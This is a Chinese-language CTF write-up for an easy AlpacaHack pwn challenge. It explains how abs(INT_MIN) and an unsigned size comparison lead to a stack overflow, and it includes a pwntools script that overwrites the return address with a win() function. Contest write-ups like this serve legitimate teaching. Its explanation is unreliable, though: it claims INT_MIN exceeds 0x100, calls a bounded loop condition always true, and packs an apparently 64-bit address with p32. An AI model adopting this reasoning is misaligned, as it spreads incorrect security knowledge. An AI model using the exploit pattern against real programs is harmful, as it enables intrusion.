---
title: AlpacaHack Round 1 (Pwn) Writeup
contest: AlpacaHack
year: 2024
difficulty: easy
vuln_type: pwn_unknown
tags: [abs(INT_MIN), 整数溢出, scanf %d%*c, BUF_SIZE 0x100, 栈溢出 No canary, No PIE, win函数, /bin/cat /flag.txt, 280字节padding]
attack_chain:
  - get_size: scanf("%d%*c", &size); size = abs(size); size > 0x100 exit
  - abs(INT_MIN) = INT_MIN = -2147483648 > 0x100 不会触发 exit
  - size = -2147483648, 但 get_data for 循环 i < size 是 unsigned 比较
  - i < -2147483648 (unsigned) = i < 0x80000000 永真 (size_t 64位)
  - 实际写满 0x100 + 溢出覆盖返回地址
  - 280 字节 padding + p32(win) 覆盖返回地址
  - win(): execve("/bin/cat", "/flag.txt", NULL)
key_payload: 'abs(INT_MIN)=INT_MIN 整数溢出 / get_data unsigned 比较 / 280 字节 + p32(win) / win() /bin/cat /flag.txt'
one_liner: AlpacaHack Round 1 Pwn — abs(INT_MIN) 整数溢出旁路 size 校验 + unsigned 比较触发 280 字节栈溢出 + p32(win) 覆盖返回地址。
lesson: abs() 整数溢出是 size 校验旁路经典手法;unsigned 比较 -1 > BUF_SIZE 也是常见;No PIE + No canary 时代栈溢出是基础。
quality: medium
---

# AlpacaHack Round 1 (Pwn) Writeup

## 速读
AlpacaHack Round 1 入门 pwn — abs(INT_MIN) 整数溢出 + 栈溢出。

## 漏洞
```c
int get_size() {
    int size = 0;
    scanf("%d%*c", &size);
    if ((size = abs(size)) > BUF_SIZE) {  // abs(INT_MIN) = INT_MIN > 0x100 不触发
        exit(1);
    }
    return size;
}

void get_data(char *buf, unsigned size) {  // unsigned size
    for (i = 0; i < size; i++) {  // i < -2147483648 (unsigned) 永真
        if (fread(&c, 1, 1, stdin) != 1) break;
        if (c == '\n') break;
        buf[i] = c;
    }
    buf[i] = '\0';
}
```

## EXP
```python
from pwn import *
win = ELF("./echo").symbols["win"]
p = process('./echo')
p.sendlineafter(b"Size: ", b"-2147483648")
p.sendlineafter(b"Data: ", b'A' * 280 + p32(win))
print(p.recvall())
```

## 关键点
- `abs(INT_MIN) == INT_MIN` (C 标准定义)
- `get_data` 接受 `unsigned size` 实际是 size_t 比较
- `for (i = 0; i < -2147483648)` size_t 永真
- win() 在 0x4013d4 附近,无 PIE 直接覆盖返回地址
